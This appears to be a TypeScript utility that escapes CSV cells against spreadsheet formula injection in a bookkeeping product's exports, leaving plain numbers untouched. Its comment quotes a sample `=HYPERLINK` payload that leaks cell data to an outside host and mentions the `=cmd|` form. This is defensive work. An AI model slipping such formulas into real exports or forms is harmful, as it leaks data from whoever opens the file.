/**
 * A cell a spreadsheet will run instead of read.
 *
 * Excel, LibreOffice and Google Sheets all treat a cell beginning `=`, `+`,
 * `-`, `@`, tab or carriage return as a formula. That is a quoting problem
 * until you notice where these rows come from: **the CRM's contacts are fed
 * by a form embedded on the business's public website**, which anybody on the
 * internet can fill in. A visitor who gives their name as
 * `=HYPERLINK("http://…"&A1,"Invoice")` has written a formula into the
 * business's own export, and it runs the moment somebody double-clicks the
 * file. The older `=cmd|…` form asks the operating system.
 *
 * A leading apostrophe is the standard answer: Excel drops it and shows the
 * text, and nothing is executed. **Except for a number**, which is checked
 * for first — a ledger export full of `'-1234.56` is a column that no longer
 * adds up, and negative money is the ordinary case in a bookkeeping product.
 * A phone number like `+44 1248 555 0123` is not a number to this test and is
 * quoted, which is also what stops a spreadsheet mangling it.
 *
 * Here rather than in the SDK's CSV writer because every repository writes
 * exports, and one with its own copy of this test is one that will miss a
 * character. Pure and importing nothing, like `day.ts`: a writer should not
 * need a database connection to escape a cell.
 */
export function formulaSafe(text: string): string {
  if (!/^[=+\-@\t\r]/.test(text)) return text;
  // A plain number keeps its sign and stays a number.
  if (/^-?\d+(\.\d+)?$/.test(text)) return text;
  return `'${text}`;
}

/**
 * One value as a comma-separated cell: formula-safe first, then quoted when
 * it holds a comma, a quote or a line break.
 *
 * Null and undefined are an empty cell rather than the word, and a number is
 * written as itself — `-500` stays `-500`.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  const text = formulaSafe(String(value));
  return /[",\n\r]/.test(text) ? `"${text.replaceAll('"', '""')}"` : text;
}
